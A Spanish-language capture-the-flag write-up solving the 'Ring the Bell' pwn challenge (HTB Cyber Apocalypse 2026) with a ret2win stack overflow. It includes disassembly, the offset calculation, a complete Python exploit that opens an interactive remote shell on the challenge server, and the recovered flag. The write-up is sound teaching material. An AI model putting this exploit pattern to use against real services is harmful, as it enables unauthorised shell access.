# Ring the Bell — pwn

**HTB Cyber Apocalypse 2026**

`HTB{R1ng4_R1ng4_R1111111nG_2022a450efd3d7efe134546b25a37907}`

> [Garran Voss] Rin! Ring the bell to call for reinforcements!

Un `ret2win` clásico: desbordamos el buffer de `main` y devolvemos a una función
`bell()` que ya está en el binario y lanza una shell.

## Reconocimiento

```
$ file ring_the_bell
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
```

Protecciones (readelf): `Type: EXEC` → **sin PIE** (direcciones fijas). Sin canario
(no hay `__stack_chk_fail`, y el prólogo no reserva cookie). Full RELRO (`BIND_NOW`), pero
da igual: no tocamos la GOT.

Símbolos relevantes:

```
000000000040176d T bell
000000000040179b T main
```

## La vulnerabilidad

`main` (desensamblado):

```asm
sub    rsp, 0x20                  ; buffer de 32 bytes en [rbp-0x20]
...
lea    rax, [rbp-0x20]
mov    edx, 0x60                  ; lee 96 bytes
mov    rsi, rax
mov    edi, 0x0                   ; stdin
call   read@plt                   ; read(0, buf, 0x60)
```

Buffer de **32 bytes**, pero `read` acepta **96**. Desbordamiento de pila directo, sin
canario que lo frene.

`bell` es la función objetivo — no necesita argumentos porque construye la shell ella misma:

```asm
000000000040176d <bell>:
  endbr64
  push   rbp
  mov    rbp, rsp
  mov    edx, 0x0                  ; NULL
  lea    rsi, [rip+0x8de]          ; "sh"
  lea    rdi, [rip+0x8d7]          ; "/bin/sh"
  call   execl@plt                 ; execl("/bin/sh", "sh", NULL)
```

## El offset

Layout de la pila en `main`: `[buf 32][saved rbp 8][return address]`.

```
offset = 32 (buffer) + 8 (rbp guardado) = 40
```

A los 40 bytes escribimos la dirección de retorno = `0x40176d` (`bell`).

**Alineación:** saltamos al *inicio* de `bell` (con su `push rbp`), así que al llegar al
`call execl` el `rsp` queda 16-alineado y glibc no revienta por `movaps`. No hace falta
un gadget `ret` extra.

## Exploit

```python
import socket, threading, sys

host, port = "154.57.164.73", 30188
offset, bell = 40, 0x40176d
payload = b"A"*offset + bell.to_bytes(8, "little")

s = socket.socket(); s.connect((host, port))
s.send(payload)

def rx():
    while True:
        d = s.recv(4096)
        if not d: break
        sys.stdout.write(d.decode(errors="ignore")); sys.stdout.flush()
threading.Thread(target=rx, daemon=True).start()

for line in sys.stdin:      # shell interactiva
    s.send(line.encode())
```

El envío del payload hace que `main` retorne a `bell`, que ejecuta `execl("/bin/sh",...)`.
La conexión queda como shell sobre el mismo socket:

```
ls
flag.txt
ring_the_bell
cat flag.txt
HTB{R1ng4_R1ng4_R1111111nG_2022a450efd3d7efe134546b25a37907}
```

## Nota

La primera versión (`code.py`) enviaba bien el payload pero solo hacía `recv` en bucle:
la shell se abría pero nunca recibía comandos. Bastó añadir un hilo lector + reenvío de
`stdin` para tener una shell interactiva y leer la flag.
```
```
